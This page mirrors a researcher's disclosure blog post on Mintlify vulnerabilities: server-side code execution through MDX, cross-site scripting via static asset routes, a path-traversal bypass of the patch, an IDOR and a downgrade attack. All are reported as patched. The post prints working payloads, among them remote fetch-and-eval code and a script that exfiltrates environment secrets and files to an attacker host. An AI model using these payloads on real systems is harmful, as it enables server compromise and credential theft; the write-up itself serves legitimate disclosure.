<!DOCTYPE html>
<html>
  <head>
    <meta charset="utf-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <title>James Routley | Feed</title>
    <link
      rel="stylesheet"
      type="text/css"
      href="../styles.css"
      media="screen"
    />
  </head>
  <body>
    <a href="/index.html">Back</a>
    <a href="https://kibty.town/blog/mintlify/">Original</a>
    <h1>How to hack Discord, Vercel and more with one easy trick</h1>
    
    <div id="readability-page-1" class="page"><article><div><p><strong>this blogpost was a collaboration with two people, their articles are here: <a href="https://gist.github.com/hackermondev/5e2cdc32849405fff6b46957747a2d28">hackermon</a> and <a href="https://heartbreak.ing/">mdl</a></strong></p>
<p>this started when i was notified that discord switched documentation platforms to <a href="https://mintlify.com">mintlify</a>, a company i briefly looked into before, and i thought it would be a good idea to take another look now that theyre bigger.</p>
<h2>introduction</h2>
<p>mintlify is a b2b saas documentation platform that allows companies to make documentation via MDX files and they host it for them, and add styling, etc.</p>
<p>some of their customers would include:</p>
<ul>
<li>discord</li>
<li>twitter</li>
<li>vercel</li>
<li>cursor</li>
</ul>
<p>...and more, you can view a full list <a href="https://www.mintlify.com/customers">here</a></p>
<p>theres also a bunch of ai features and stuff, but thats beyond the point</p>
<p>so, i signed up and got to digging.</p>
<h2>the rce (CVE-2025-67843)</h2>
<p>mintlify uses MDX to render docs their customers provide, and i was wondering how they render it on the server-side for static page generation (because a docs site needs that for search engines/bots).</p>
<p>this is because mdx is basically jsx (think react) combined with markdown, meaning you can add js expressions to your markdown. so whats preventing us from making a jsx expression that evaluates code on the server?</p>
<p>well, i tried it with a simple payload to just eval things from a webserver</p>
<pre><code>{!!<span>fetch</span>(<span>&#34;https://attacker.kibty.town&#34;</span>).<span>then</span>(<span>(<span>r</span>) =&gt;</span> r.<span>text</span>()).<span>then</span>(<span>(<span>c</span>) =&gt;</span> <span>eval</span>(c))}
</code></pre>
<p>i deployed it to mintlify and went to the page it was on, and i got a request from a vercel/amazon ip! are they really doing this on their nextjs app?</p>
<p>i wrote a simple script to exfilitrate some data such as the process.env (and app files) to find out:</p>
<pre><code><span>const</span> <span>exfil</span> = (<span>data</span>) =&gt;
  <span>fetch</span>(<span>&#34;https://attacker.kibty.town&#34;</span>, {
    <span>method</span>: <span>&#34;POST&#34;</span>,
    <span>body</span>: <span>JSON</span>.<span>stringify</span>(data),
  });
<span>exfil</span>({ <span>files</span>: [{ <span>name</span>: <span>&#34;.env.json&#34;</span>, <span>content</span>: <span>JSON</span>.<span>stringify</span>(process.<span>env</span>) }] });
<span>try</span> {
  <span>import</span>(<span>&#34;fs&#34;</span>).<span>then</span>(<span>async</span> (a) =&gt; {
    <span>const</span> arr = [];
    <span>for</span> (<span>const</span> filename <span>of</span> a.<span>readdirSync</span>(<span>&#34;.&#34;</span>, { <span>recursive</span>: <span>true</span> })) {
      <span>if</span> (a.<span>lstatSync</span>(filename).<span>isDirectory</span>()) <span>continue</span>;
      <span>const</span> content = a.<span>readFileSync</span>(filename, <span>&#34;utf-8&#34;</span>);
      arr.<span>push</span>({ <span>name</span>: filename, content });
    }
    <span>console</span>.<span>log</span>(arr.<span>length</span>);
    <span>await</span> <span>exfil</span>({ <span>files</span>: arr });
    <span>console</span>.<span>log</span>(<span>&#34;done exfiling&#34;</span>);
  });
} <span>catch</span> (error) {
  <span>exfil</span>(error);
}
</code></pre>
<p>and, after running it, this is what i got:</p>
<p><img src="https://kibty.town/files/img/posts/mintlify/next-env.png" alt=""/></p>
<p><strong>shit. this is bad, we have full access.</strong></p>
<h3>impact</h3>
<p>i quickly realised that this was the server-side serverless (lol) environment of their main documentation app, while this calls to a external api to do everything, we have the token it calls it with in the env.</p>
<p>alongside, we can poison the nextjs cache for everyone <strong>for any site</strong>, allowing mass xss, defacing, etc on any docs site.</p>
<p>we can also pretend nonexistent pages exist in the cache, allowing targeted xss too</p>
<p>with the other keys we could also:</p>
<ul>
<li>poisoned mintlifys analytics</li>
<li>ruined mintlifys feature flagging</li>
<li>dos&#39;ed customer sites via path validations</li>
<li>trigger a bunch of pdf exports which would jack up mintlifys cloudconvert bill</li>
</ul>
<p>so:</p>
<ul>
<li>mass xss (on customer domains)</li>
<li>targeted xss (on custom domains)</li>
</ul>
<p>very bad.</p>
<h2>targeted xss (CVE-2025-67842)</h2>
<p>after getting all of the server routes, i noticed a interesting one: <code>/_mintlify/static/[subdomain]/{...path}</code>. this route seemed to allow you to get static images from your repository, such as svgs, pngs, etc.</p>
<p>what if i could access my organizations asset from another domain?</p>
<p>well i tried, i crafted a url that looked like</p>
<pre><code>https://discord.com/_mintlify/static/evascoolcompany/xss.svg
</code></pre>
<p>which, the svg on my repository having this content:</p>
<pre><code><span>&lt;<span>svg</span> <span>xmlns</span>=<span>&#34;http://www.w3.org/2000/svg&#34;</span> <span>onload</span>=<span>&#34;alert(window.origin);&#34;</span>/&gt;</span>
</code></pre>
<p>and when i went to the url, i got this:</p>
<p><img src="https://kibty.town/files/img/posts/mintlify/discord-alert.png" alt=""/></p>
<p><strong>well, fuck.</strong></p>
<h3>impact</h3>
<p>this allows complete 1 click xss on users who click a link. definitely not great, but it makes the fact worse that most companies dont properly scope cookies, or have their documentation on a subpath (such as <code>/path</code>).</p>
<p>the latter was true in discords case, their documentation was on <code>/developers/docs</code>, and i can just get the <code>token</code> value from localstorage directly, and exfiltrate it using whatever i want</p>
<p>some other companies that i could do full exploitation on are twitter, vercel and cursor. though we did not check many companies and there is definitely more</p>
<h2>an unexpected message</h2>
<p>a few hours after i started looking into this, i got an unexpected, sort of out of nowhere message from a friend, <a href="https://gist.github.com/hackermondev/5e2cdc32849405fff6b46957747a2d28">hackermon</a>, who had found the targeted xss independently aswell</p>
<p><img src="https://kibty.town/files/img/posts/mintlify/hackermon-message.png" alt=""/></p>
<p>we started looking into this together, alongside <a href="https://heartbreak.ing/">mdl</a>, who was also looking into it with hackermon</p>
<p>also checkout their blogposts <a href="https://gist.github.com/hackermondev/5e2cdc32849405fff6b46957747a2d28">here</a> and <a href="https://heartbreak.ing/">here!</a> (respectively)</p>
<p>we also got in contact with mintlify, and started disclosing everything we already had and future things directly to them</p>
<h2>here comes the patch bypass (CVE-2025-67845)</h2>
<p>after mintlify patched the targeted xss via static, i was looking at the code for the route and had an idea</p>
<p>the code for the endpoint looked like this (not exact, recreation):</p>
<pre><code><span>export</span> <span>async</span> <span>function</span> <span>GET</span>(<span>_, { params }</span>) {
  <span>const</span> { subdomain, <span>path</span>: pathParts } = <span>await</span> params;
  <span>const</span> path = <span>&#34;/&#34;</span> + pathParts.<span>join</span>(<span>&#34;/&#34;</span>);

  <span>const</span> url = <span>`<span>${CDN_BASE_URL}</span>/<span>${subdomain}</span><span>${path}</span>`</span>;
  <span>const</span> res = <span>await</span> <span>fetch</span>(url);

  <span>if</span> (!res.<span>ok</span>)
    <span>return</span> <span>new</span> <span>NextResponse</span>(<span>&#34;Asset not found&#34;</span>, {
      <span>status</span>: <span>404</span>,
    });

  <span>return</span> res; 
}
</code></pre>
<p>and i realised, nothing prevents us from adding url encoded path traversal in a part of a path, to climb up the cdn path</p>
<p>so i crafted a url and tested, it looked like</p>
<pre><code>https://discord.com/_mintlify/static/discord/images/create-team-owned-app.png%2F..%2F..%2F..%2Fevascoolcompany%2Fxss.svg
</code></pre>
<p>and i was met with the beautiful alert page again</p>
<p><img src="https://kibty.town/files/img/posts/mintlify/discord-alert.png" alt=""/></p>
<p>always remember to encode your paths properly!</p>
<h2>non-critical vulnerabilities</h2>
<p>alongside this, i found a few non-critical vulnerabilties which don&#39;t deserve an entire section, so here they are:</p>
<ul>
<li>github idor (CVE-2025-67844): mintlify doesn&#39;t validate the github repository owner/name fields on their api while your setting it, allowing you to set it to any authorized repository. allowing you to view commit details (message, hash, filename, files changed, etc) for new commits</li>
<li>downgrade attack (CVE-2025-67846): mintlify uses vercel to facilitate deployments of both their client and the dashboard. a common pitfall when using vercel is that you fail to remove a previous deployment with a vulnerability in it, so you can target a specific previous vulnerable deployment id / git branch / git ref, and use that to facilitate the patched exploit.</li>
</ul>
<p>add it to your repository, wait for the deployment to build and access it on any mintlify-provided documentation/custom domain with the path <code>/_mintlify/static/evascoolcompany/xss.svg</code> or similar with prefixes</p>
<h2>lets talk impact (again)</h2>
<p>all together, i think this series of vulnerabilities had very big impact. considering we could supply chain attack various big fortune 500 companies, including but not limited to:</p>
<ul>
<li>discord</li>
<li>twitter</li>
<li>vercel</li>
<li>cursor</li>
</ul>
<p>...and more, you can view a full list <a href="https://www.mintlify.com/customers">here</a></p>
<p>we could on targeted companies:</p>
<ul>
<li>override pages on docs to deface, or xss</li>
<li>get 1 click xss</li>
<li>view commits or push to repositories</li>
</ul>
<h2>the patch</h2>
<p>after we got in contact with mintlify, everything was patched very swiftly. and i was awarded <strong>5,000 USD</strong> for my efforts and findings.</p>
<p>the patches for the vulnerabilties were:</p>
<ul>
<li>the rce (CVE-2025-67843): not parsing non-simple mdx expressions on ssr, but still parsing on client</li>
<li>targeted xss (CVE-2025-67842): you are now not able to reach any mintlify assets that are not on the same organization</li>
<li>targeted xss patch bypass (CVE-2025-67845): theres now checks to make sure you aren&#39;t path traversing the cdn path</li>
<li>github idor (CVE-2025-67844): its now checked on setting github repository that the github app installation registered to your mintlify account has access to the specified repository</li>
<li>downgrade attack (CVE-2025-67846): theres now a visitor password on preview deployments on vercel and purging old deployments that were vulnerable, you can read the vercel documentation on this <a href="https://vercel.com/kb/guide/how-do-i-delete-an-individual-deployment">here</a></li>
</ul>
<p>make sure to check out <a href="https://gist.github.com/hackermondev/5e2cdc32849405fff6b46957747a2d28">hackermon</a> and <a href="https://heartbreak.ing/">mdl</a>&#39;s reports for more details on other vulnerabilties, and the possible exploitation that couldve happened.</p>
<p><img src="https://kibty.town/files/img/posts/mintlify/cve-card.png" alt=""/></p>
<p><em>card by <a href="https://marsh.zone">marshift</a></em></p>
</div></article></div>
  </body>
</html>
